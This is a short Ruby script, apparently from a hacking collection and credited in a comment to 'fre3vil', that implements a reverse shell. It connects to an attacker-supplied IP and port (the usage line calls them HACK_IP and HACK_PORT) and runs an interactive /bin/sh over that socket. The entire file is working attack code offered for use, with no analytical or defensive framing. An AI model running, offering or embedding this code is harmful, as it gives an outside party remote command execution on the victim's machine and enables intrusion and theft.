#!/usr/bin/env ruby
# code by fre3vil
# This code maybe not works well

require 'socket'

ip, port = ARGV

if ip.nil? || port.nil?
  puts "ruby #{__FILE__}.rb [HACK_IP HACK_PORT]\n\n"
  exit
end

s = TCPSocket.open(ip, port).to_i

exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
